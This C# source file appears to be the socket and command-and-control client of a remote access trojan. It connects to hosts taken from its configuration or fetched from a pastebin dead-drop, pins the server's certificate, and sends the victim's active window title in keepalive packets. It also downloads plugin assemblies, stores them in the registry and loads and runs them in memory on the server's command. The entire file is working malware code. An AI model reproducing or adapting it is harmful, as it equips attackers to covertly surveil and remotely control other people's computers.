using Client.Helper;
using MessagePackLib.MessagePack;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;

namespace Client.Connection
{
    public static class ClientSocket
    {
        public static List<MsgPack> Packs { get; private set; } = new List<MsgPack>();

        public static Socket TcpClient { get; private set; }

        public static SslStream SslClient { get; private set; }

        private static byte[] Buffer { get; set; }

        private static long HeaderSize { get; set; }

        private static long Offset { get; set; }

        private static Timer KeepAlive { get; set; }

        public static bool IsConnected { get; private set; }

        private static readonly object SendSync = new object();

        private static Timer Ping { get; set; }

        public static int Interval { get; set; }

        public static bool ActivatePo_ng { get; set; }

        public static void InitializeClient()
        {
            try
            {
                TcpClient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                    ReceiveBufferSize = 51200,
                    SendBufferSize = 51200
                };

                ConnectToServer();

                if (TcpClient.Connected)
                {
                    IsConnected = true;
                    SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
                    HeaderSize = 4L;
                    Buffer = new byte[HeaderSize];
                    Offset = 0L;
                    Send(IdSender.SendInfo());
                    Interval = 0;
                    ActivatePo_ng = false;
                    KeepAlive = new Timer(KeepAlivePacket, null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
                    Ping = new Timer(Po_ng, null, 1, 1);
                    SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServerData, null);
                }
                else
                {
                    IsConnected = false;
                }
            }
            catch
            {
                IsConnected = false;
            }
        }

        private static void ConnectToServer()
        {
            if (Settings.pasteBin == "null")
            {
                string host = Settings.hosTs.Split(',')[new Random().Next(Settings.hosTs.Split(',').Length)];
                int port = Convert.ToInt32(Settings.porTs.Split(',')[new Random().Next(Settings.porTs.Split(',').Length)]);

                if (IsValidDomainName(host))
                {
                    foreach (IPAddress address in Dns.GetHostAddresses(host))
                    {
                        try
                        {
                            TcpClient.Connect(address, port);
                            if (TcpClient.Connected) break;
                        }
                        catch
                        {
                            // Handle connection failure
                        }
                    }
                }
                else
                {
                    TcpClient.Connect(host, port);
                }
            }
            else
            {
                using (WebClient webClient = new WebClient())
                {
                    webClient.Credentials = new NetworkCredential("", "");
                    string[] strArray = webClient.DownloadString(Settings.pasteBin).Split(new[] { ':' }, StringSplitOptions.None);
                    Settings.hosTs = strArray[0];
                    Settings.porTs = strArray[new Random().Next(1, strArray.Length)];
                    TcpClient.Connect(Settings.hosTs, Convert.ToInt32(Settings.porTs));
                }
            }
        }

        private static bool IsValidDomainName(string name) => Uri.CheckHostName(name) != UriHostNameType.Unknown;

        private static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return Settings.serverCertificate.Equals(certificate);
        }

        public static void Reconnect()
        {
            try
            {
                Ping?.Dispose();
                KeepAlive?.Dispose();
                SslClient?.Dispose();
                TcpClient?.Dispose();
            }
            catch
            {
                // Handle exceptions
            }

            IsConnected = false;
        }

        private static void ReadServerData(IAsyncResult ar)
        {
            try
            {
                if (!TcpClient.Connected || !IsConnected)
                {
                    IsConnected = false;
                    return;
                }

                int bytesRead = SslClient.EndRead(ar);
                if (bytesRead > 0)
                {
                    Offset += bytesRead;
                    HeaderSize -= bytesRead;

                    if (HeaderSize == 0)
                    {
                        ProcessReceivedData();
                    }
                    else if (HeaderSize < 0)
                    {
                        IsConnected = false;
                    }
                    else
                    {
                        SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServerData, null);
                    }
                }
                else
                {
                    IsConnected = false;
                }
            }
            catch
            {
                IsConnected = false;
            }
        }

        private static void ProcessReceivedData()
        {
            HeaderSize = BitConverter.ToInt32(Buffer, 0);
            if (HeaderSize > 0)
            {
                Offset = 0;
                Buffer = new byte[HeaderSize];

                while (HeaderSize > 0)
                {
                    int bytesRead = SslClient.Read(Buffer, (int)Offset, (int)HeaderSize);
                    if (bytesRead <= 0)
                    {
                        IsConnected = false;
                        return;
                    }

                    Offset += bytesRead;
                    HeaderSize -= bytesRead;

                    if (HeaderSize < 0)
                    {
                        IsConnected = false;
                        return;
                    }
                }

                new Thread(Read).Start(Buffer);
                ResetReadState();
            }
            else
            {
                ResetReadState();
            }
        }

        private static void ResetReadState()
        {
            Offset = 0;
            HeaderSize = 4;
            Buffer = new byte[HeaderSize];
            SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServerData, null);
        }

        public static void Send(byte[] msg)
        {
            lock (SendSync)
            {
                try
                {
                    if (!IsConnected) return;

                    byte[] lengthBytes = BitConverter.GetBytes(msg.Length);
                    TcpClient.Poll(-1, SelectMode.SelectWrite);
                    SslClient.Write(lengthBytes, 0, lengthBytes.Length);

                    if (msg.Length > 1000000)
                    {
                        using (MemoryStream memoryStream = new MemoryStream(msg))
                        {
                            memoryStream.Position = 0;
                            byte[] buffer = new byte[50000];
                            int count;
                            while ((count = memoryStream.Read(buffer, 0, buffer.Length)) > 0)
                            {
                                TcpClient.Poll(-1, SelectMode.SelectWrite);
                                SslClient.Write(buffer, 0, count);
                                SslClient.Flush();
                            }
                        }
                    }
                    else
                    {
                        TcpClient.Poll(-1, SelectMode.SelectWrite);
                        SslClient.Write(msg, 0, msg.Length);
                        SslClient.Flush();
                    }
                }
                catch
                {
                    IsConnected = false;
                }
            }
        }

        public static void KeepAlivePacket(object obj)
        {
            try
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "Ping";
                msgPack.ForcePathObject("Message").AsString = Methods.GetActiveWindowTitle();
                Send(msgPack.Encode2Bytes());
                GC.Collect();
                ActivatePo_ng = true;
            }
            catch
            {
                // Handle exceptions
            }
        }

        private static void Po_ng(object obj)
        {
            try
            {
                if (!ActivatePo_ng || !IsConnected) return;
                Interval++;
            }
            catch
            {
                // Handle exceptions
            }
        }

        public static void Read(object data)
        {
            try
            {
                MsgPack unpackMsgPack = new MsgPack();
                unpackMsgPack.DecodeFromBytes((byte[])data);

                switch (unpackMsgPack.ForcePathObject("Pac_ket").AsString)
                {
                    case "Po_ng":
                        ActivatePo_ng = false;
                        MsgPack msgPack = new MsgPack();
                        msgPack.ForcePathObject("Pac_ket").SetAsString("Po_ng");
                        msgPack.ForcePathObject("Message").SetAsInteger(Interval);
                        Send(msgPack.Encode2Bytes());
                        Interval = 0;
                        break;
                    case "plu_gin":
                        HandlePlugin(unpackMsgPack);
                        break;
                    case "save_Plugin":
                        SavePlugin(unpackMsgPack);
                        break;
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        private static void HandlePlugin(MsgPack unpackMsgPack)
        {
            try
            {
                // Vérifiez si le plugin n'est pas déjà enregistré dans le registre
                if (SetRegistry.GetValue(unpackMsgPack.ForcePathObject("Dll").AsString) == null)
                {
                    // Ajoutez le paquet à la liste des paquets
                    Packs.Add(unpackMsgPack);
            
                    // Créez un nouveau paquet pour demander l'envoi du plugin
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "sendPlugin";
                    msgPack.ForcePathObject("Hashes").AsString = unpackMsgPack.ForcePathObject("Dll").AsString;
            
                    // Envoyez le paquet
                    Send(msgPack.Encode2Bytes());
                }
                else
                {
                    // Invoquez directement le paquet s'il est déjà enregistré
                    Invoke(unpackMsgPack);
                }
            }
            catch (Exception ex)
            {
                // Gérer les exceptions et envoyer un message d'erreur
                Error(ex.Message);
            }
        }


        private static void SavePlugin(MsgPack unpackMsgPack)
        {
            try
            {
                SetRegistry.SetValue(unpackMsgPack.ForcePathObject("Hash").AsString, unpackMsgPack.ForcePathObject("Dll").GetAsBytes());

                foreach (var pack in Packs.ToList())
                {
                    if (pack.ForcePathObject("Dll").AsString == unpackMsgPack.ForcePathObject("Hash").AsString)
                    {
                        Invoke(pack);
                        Packs.Remove(pack);
                    }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        private static void Invoke(MsgPack unpackMsgPack)
        {
            try
            {
                var assemblyData = SetRegistry.GetValue(unpackMsgPack.ForcePathObject("Dll").AsString);
                var assembly = AppDomain.CurrentDomain.Load(Zip.Decompress(assemblyData));
                var pluginType = assembly.GetType("Plugin.Plugin");

                if (pluginType != null)
                {
                    var instance = Activator.CreateInstance(pluginType);
                    var method = pluginType.GetMethod("Run");

                    method?.Invoke(instance, new object[]
                    {
                        TcpClient,
                        Settings.serverCertificate,
                        Settings.hwId,
                        unpackMsgPack.ForcePathObject("Msgpack").GetAsBytes(),
                        MutexControl.currentApp,
                        Settings.mtx,
                        Settings.bsOd,
                        Settings.inStall
                    });

                    Received();
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        private static void Received()
        {
            try
            {
                var msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = Encoding.Default.GetString(Convert.FromBase64String("UmVjZWl2ZWQ="));
                Send(msgPack.Encode2Bytes());
                Thread.Sleep(1000);
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            try
            {
                var msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = nameof(Error);
                msgPack.ForcePathObject(nameof(Error)).AsString = ex;
                Send(msgPack.Encode2Bytes());
            }
            catch
            {
                // Handle exceptions
            }
        }
    }
}
